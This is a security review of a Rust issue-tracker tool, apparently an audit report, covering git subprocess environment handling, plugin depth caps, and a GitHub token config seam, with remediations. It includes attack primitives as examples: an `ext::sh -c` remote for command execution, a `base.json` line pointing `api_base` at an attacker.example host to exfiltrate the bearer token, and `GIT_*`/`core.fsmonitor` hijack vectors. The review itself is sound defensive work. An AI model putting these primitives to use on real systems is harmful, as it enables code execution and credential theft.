# Security review — subprocess, git, paths, secrets (bl-2d6d)

Scope: git command construction (`src/git.rs`, `src/tracker/git.rs`,
`src/tracker/remote_ops.rs`, `src/bin/tracker.rs`), env handling, path/encoding
safety (`src/encoding.rs`, `src/layout.rs`, `src/delivery.rs`), the §6 plugin
trust boundary (`src/plugin.rs`, `src/install.rs`, `src/registry.rs`), remote
push/fetch trust, and the github-issues token/`base.json` seam (sibling repo
`balls-github-plugin`). Reviewed at `main` a5d36b9.

Findings are ranked by severity. Each names a concrete locus and a remediation.

---

## What is already right (baseline)

These are load-bearing and should not regress:

- **No shell anywhere.** Every external call is `Command::new("git"|<bin>)` with
  an argument *vector* — never `sh -c`, never string interpolation. Classic shell
  injection is structurally absent (`git.rs:62`, `tracker/git.rs:20`,
  `plugin.rs:195`).
- **Commit messages ride stdin, not argv.** `seal` does `git commit -F -` with the
  message piped (`git.rs:97`), so a hostile ball title/body can never inject git
  flags or arguments through the commit message.
- **ff-only is the contention contract.** `sync`/`push` use `merge --ff-only` /
  plain `push` and let git's non-zero exit surface (`remote_ops.rs:23,38`); a
  divergent remote can never silently rewrite local state.
- **Percent-encoding neutralizes `..` for clone paths.** `percent_encode` turns any
  `/` into `%2F`, so an invocation path or remote URL occupies exactly one
  directory component and cannot traverse (`encoding.rs:20`, tested at
  `encoding.rs:66`).
- **GitHub token is stored 0600 and never logged or passed via env**
  (`auth.rs:42`); it is read from a file the plugin owns, not the process
  environment.

---

## HIGH-1 — git runs with an unscrubbed environment (GIT_* hijack + `ext::`/arg injection)

**Locus:** `src/git.rs:62` (`run`) and `src/tracker/git.rs:20` (`git`) — the two
git spawn sites. Neither clears or pins the git environment, and
`remote_ops.rs:22/38/55` passes the remote and branch as bare positional args.

`grep -rn 'env_clear|GIT_DIR|GIT_CONFIG|GIT_SSH|protocol.ext' src/` returns
**nothing** in non-test code. Two consequences:

1. **Ambient-environment hijack (outside the config trust model).** balls inherits
   the full process environment when it spawns `git`. A hostile ambient value —
   `GIT_CONFIG_GLOBAL` / `GIT_CONFIG_SYSTEM` pointing at an attacker file (which can
   set `core.fsmonitor`, `core.hooksPath`, `core.sshCommand`, `core.pager`,
   `alias.*`, `protocol.ext.allow`), `GIT_SSH_COMMAND`, or
   `GIT_DIR`/`GIT_WORK_TREE`/`GIT_INDEX_FILE` — subverts *every* git call balls
   makes. `core.fsmonitor=<cmd>` alone yields command execution on routine git
   operations; `GIT_DIR` silently redirects balls onto the wrong repository (the
   `-C <cwd>` is overridden by `GIT_DIR`). This is **not** covered by §4's
   "all config is RCE, `install` is the consent boundary" — the process
   environment is an input that bypasses the install consent entirely. A user who
   audits every installed config is still popped if `bl` runs under direnv, a CI
   runner, a wrapper script, or any parent that exported a `GIT_*` var. The task
   brief explicitly flagged "GIT_* stripping" as expected — it is absent.

2. **`ext::` remote + argument injection.** `remote` and `tasks_branch` reach git
   as positional args with no `--` guard and no scheme vetting
   (`fetch <remote> <branch>`, `push <remote> <branch>`). A configured remote of
   `ext::sh -c '<payload>'` is arbitrary command execution on every
   `sync`/`push`/`fetch_config` (`protocol.ext.allow` defaults to `user`, which
   permits `ext::` for a command-line URL). A remote or branch beginning with `-`
   is option-injection into fetch/push. This rides the §4 config-is-RCE model, but
   the remote is also settable via `bl prime --remote <url>` and there is zero
   transport allow-listing as defense-in-depth.

**Severity: HIGH.** (1) is an env-borne RCE/repo-redirect that escapes the
documented trust boundary; (2) is a concrete RCE primitive in the remote string.

**Remediation (one fix covers both sites and both prongs):** funnel all git
spawns through a single hardened constructor that:
- clears the git-controlling environment — `cmd.env_clear()` is too broad, so
  remove the `GIT_*` family explicitly (`GIT_DIR`, `GIT_WORK_TREE`,
  `GIT_INDEX_FILE`, `GIT_OBJECT_DIRECTORY`, `GIT_ALTERNATE_OBJECT_DIRECTORIES`,
  `GIT_CONFIG`, `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, `GIT_SSH`,
  `GIT_SSH_COMMAND`, `GIT_PROXY_COMMAND`, `GIT_EXTERNAL_DIFF`, `GIT_PAGER`,
  `GIT_NAMESPACE`) and set `GIT_CONFIG_GLOBAL=/dev/null`,
  `GIT_CONFIG_SYSTEM=/dev/null`, `GIT_PROTOCOL_FROM_USER=0`;
- pins protocol policy on the command line: `-c protocol.ext.allow=never
  -c protocol.allow=user -c protocol.file.allow=user` (forbid the `ext::`/`fd::`
  shell transports);
- rejects any `remote`/`tasks_branch`/refspec that begins with `-`, and inserts an
  `--end-of-options` / `--` separator before refspec arguments where git accepts
  one.

This is the single highest-leverage change; `tracker/git.rs` and `git.rs` should
share the hardened helper so the policy has one home (§0 single-source).

---

## MED-1 — depth-cap silently suppresses plugins instead of fail+rollback (code lags frozen spec)

**Locus:** `src/plugin.rs:141` (`suppressed`) → `:231/:238` (`run`/`rollback`
short-circuit to `Ok(())` / no-op at `DEPTH_CAP`).

The code implements the **old** §6 disposition: at the cap the op runs
PLUGIN-FREE, "suppressed, not refused." The post-freeze decision **bl-7110**
(`docs/architecture.md:1363`) explicitly **flipped** this:

> "Running PLUGIN-FREE at the cap converts that runaway into QUIET wrong-behavior:
> the offending plugin gets no signal and the op silently runs without the plugins
> it expected — the worst disposition. … RESOLVED, two moves: disposition FLIP
> (suppress → fail+rollback) … Cap-hit now ABORTS + rolls back with a diagnostic
> naming the op/plugin chain."

The decision log records "No code follow-up filed; enforcement lives in core
dispatch/run" — so the spec moved and the code did not. The security edge: a
suppressed plugin can be a **control**, e.g. a forge gated-delivery plugin
(gating model: `docs/architecture.md` §10). Reaching depth 8 makes `close` deliver
**without** the gate, silently — a control bypass, not just a missing feature.

**Severity: MEDIUM.** Reaching the cap accidentally is hard (legit shell-backs go
~1 deep), and a *malicious* plugin already runs arbitrary code; but the silent
suppression of a security control on an honest-but-deep chain is exactly the
disposition the freeze rejected.

**Remediation:** implement bl-7110 — at `self.depth >= DEPTH_CAP`, return an
`io::Error` that aborts the op and drives the §8/§14 reverse-order rollback, with a
diagnostic naming the op and plugin chain. Delete the silent `Ok(())`/no-op path.

---

## MED-2 — GitHub token exfiltration via unpinned `api_base` (the base.json seam)

**Locus (sibling repo):** `balls-github-shared/src/config_base.rs:21` (`api_base`
deserialized from config JSON, default `https://api.github.com`, **no scheme/host
validation**) → `http.rs:51` sends `Authorization: Bearer <token>` to whatever
`api_base` names.

`api_base` is plain config. Config travels between checkouts by `bl install`
(§6), so a shared/center `base.json` carrying
`"api_base":"https://collector.attacker.example"` silently redirects the
**credential** — the next `sync`/`push` mints `Bearer <token>` straight to the
attacker's host. `validate()` checks only that `repo` is `owner/name`; the API
host is unchecked, and `http://` is accepted (cleartext token).

A secondary, smaller issue: `auth.rs:19` writes `token.json` then chmods to 0600
(`auth.rs:25` → `restrict`). Between the `fs::write` and the chmod the file exists
at the process umask (commonly 0644) — a TOCTOU window where a co-tenant can read
the token.

**Severity: MEDIUM** (credential exfiltration to a third party — sharper than the
on-box RCE the §4 install-consent model contemplates, because the secret leaves
the machine).

**Remediation:**
- Pin `api_base` to `https://` and reject `http://`; ideally warn (or require an
  explicit `--allow-custom-api-base`) whenever `api_base` ≠ the github.com default,
  so a redirected base is a visible decision, not a silent config diff.
- Bind the stored token to its `api_base` host (store `{host, token}` and refuse to
  send a token minted for `api.github.com` to any other host) so a redirected base
  cannot reuse an existing credential.
- Close the chmod race: create `token.json` with `OpenOptions`
  `.create_new(true).mode(0o600)` (or write to a 0600 temp + rename) instead of
  `fs::write` then chmod.

---

## LOW-1 — unbounded plugin stderr/stdout line → OOM

**Locus:** `src/plugin.rs:223` — `relay` does `BufReader::new(stderr).lines()`,
which allocates a **whole line** into a `String` before `log.rs` truncates it to
`LINE_MAX` (4096) at write time. A plugin emitting a multi-gigabyte stderr blob
with no newline OOMs the parent before truncation ever applies. `describe`
(`plugin.rs:106`) likewise reads unbounded plugin stdout via `Command::output()`
at install.

**Severity: LOW** (a plugin is semi-trusted; this is DoS, not escalation).

**Remediation:** bound the per-line read — `read_until(b'\n', …)` with a byte
ceiling, or `Read::take(LINE_MAX * k)` — so a missing newline can't be weaponized;
cap `describe`'s captured stdout similarly.

---

## LOW-2 — mirrored delivery worktree path trusts invocation_path canonicality

**Locus:** `src/delivery.rs:161` (`binding_territory`) —
`plugin_territory.join(invocation_path.trim_start_matches('/'))`. Unlike the clone
bundle (percent-encoded, `..`-neutralized), the delivery worktree **mirrors** the
invocation path verbatim (deliberately, so `cargo`/`rust-lld` see no `%`,
bl-f3e4). The `..`-neutralization that percent-encoding gives is therefore given
up here. Safe **today** because `invocation_path` is `env::current_dir()` (a real,
canonical absolute path with no `..` components, `main.rs:20`), but the safety is
a property of the caller, not enforced at the seam — a future caller passing a
`..`-bearing path would let the worktree escape plugin territory.

**Severity: LOW** (not reachable via current inputs).

**Remediation (defense-in-depth):** at the binary edge, assert `invocation_path`
is absolute and contains no `..` component before it is mirrored; reject otherwise.

---

## INFO — the recursion cap is a footgun-guard, not a sandbox

`BALLS_PLUGIN_DEPTH` is passed in the child environment (`plugin.rs:201`) and read
back at the edge (`main.rs:22`). A plugin fully controls the environment of the
`bl` it spawns and can reset `BALLS_PLUGIN_DEPTH=0`, defeating the cap. This is
**acceptable** — a plugin is already arbitrary local code, so the cap exists to
stop *accidental* cascades, not malicious ones — but it should be documented as a
footgun-guard so no future control is built on top of it as if it were a security
boundary.

---

## Suggested follow-up balls

| Sev | Finding | Fix home |
|-----|---------|----------|
| HIGH | Unscrubbed git env + `ext::`/arg injection | one hardened git-spawn helper shared by `git.rs` + `tracker/git.rs` |
| MED | Depth-cap suppress → implement bl-7110 fail+rollback | `plugin.rs` dispatch |
| MED | Unpinned `api_base` token exfil + chmod TOCTOU | `balls-github-plugin` (`config_base.rs`, `auth.rs`) |
| LOW | Unbounded plugin stderr/stdout OOM | `plugin.rs` `relay`/`describe` |
| LOW | Mirrored worktree path `..` assertion | edge, before `delivery::binding_territory` |
